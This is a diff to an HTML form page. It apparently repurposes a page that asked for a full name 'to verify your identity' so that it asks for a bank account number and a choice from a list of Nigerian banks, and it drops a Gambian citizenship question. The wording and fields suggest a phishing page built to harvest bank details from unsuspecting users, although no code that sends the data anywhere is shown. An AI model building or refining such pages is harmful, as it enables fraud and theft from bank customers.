@@ -151,7 +151,7 @@ button {
     border-radius: 5px;
     padding: 0 10px;
     margin: 10px auto;
-    background: rgb(46, 140, 4);
+    background: rgb(10, 27, 82);
     transition: background 0.3s ease;
 }
 button:hover {
@@ -758,18 +758,60 @@ input:focus, select:focus, textarea:focus {
 
   <!-- Full Name Field -->
   <div class="phone" style="margin-bottom: 20px; text-align: center;">
-    <p class="title" style="font-weight: bold; margin-bottom: 10px;">ENTER YOUR FULL NAME HERE TO VERIFY YOUR IDENTITY:</p>
-    <input type="text" placeholder="Full name here" id="name" name="full_name" style="width: 100%; max-width: 330px; height: 56px; font-size: 18px; padding: 10px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;">
+    <p class="title" style="font-weight: bold; margin-bottom: 10px;">ENTER YOUR BANK ACCOUNT NUMBER HERE:</p>
+    <input type="text" placeholder="Enter Account Number" id="name" name="full_name" style="width: 100%; max-width: 330px; height: 56px; font-size: 18px; padding: 10px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;">
   </div>
 
-  <select style="width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;">
-    <option value="">Are you a citizen of The Gambia</option>
-  <option>Yes</option>
-  <option>No</option>
-  <option>Visitor</option>
-</select>
-
   
+
+  <!-- Bank Selection Dropdown -->
+  <div class="phone" style="margin-bottom: 20px; text-align: center;">
+    <p class="title" style="font-weight: bold; margin-bottom: 10px;">Select Your Bank:</p>
+    <select name="bank_name" id="bank" style="width: 100%; max-width: 330px; height: 56px; font-size: 16px; padding: 10px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;">
+      <option value="" selected>--------CHOOSE YOUR BANK----------</option>
+      <option value="2"> Access Bank Plc. </option>
+<option value="3"> Citibank Nigeria Limited </option>
+<option value="4"> Ecobank Nigeria Limited</option>
+<option value="6"> Fidelity Bank Plc.</option>
+
+<option value="8"> First Bank of Nigeria</option>
+<option value="9"> First City Monument Bank </option>
+<option value="10"> Globus Bank</option>
+<option value="11"> Guaranty Trust Bank</option>
+<option value="12"> Heritage Bank Plc. </option>
+<option value="13"> Keystone Bank </option>
+  <option value="2"> Optimus Bank </option>
+
+<option value="3"> Parallex Bank </option>
+
+<option value="4"> Polaris Bank</option>
+
+<option value="6"> Premium Trust Bank</option>
+
+<option value="7"> Providus Bank Plc.</option>
+
+<option value="8"> Signature Bank</option>
+
+<option value="9"> Stanbic IBTC Bank Plc.</option>
+
+<option value="10"> Standard Chartered Bank </option>
+
+<option value="11"> Sterling Bank Plc. </option>
+
+<option value="12"> SunTrust Bank </option>
+
+<option value="13"> Titan Trust Bank </option>
+  <option value="9"> Union Bank Plc.</option>
+
+<option value="10"> United Bank for Africa Plc.</option>
+
+<option value="11"> Unity Bank Plc. </option>
+
+<option value="12"> Wema Bank Plc. </option>
+
+<option value="13"> Zenith Bank Plc. </option>
+  <option value="2">Others</option>
+    </select>
   </div>
 
   <!-- Optional Note -->
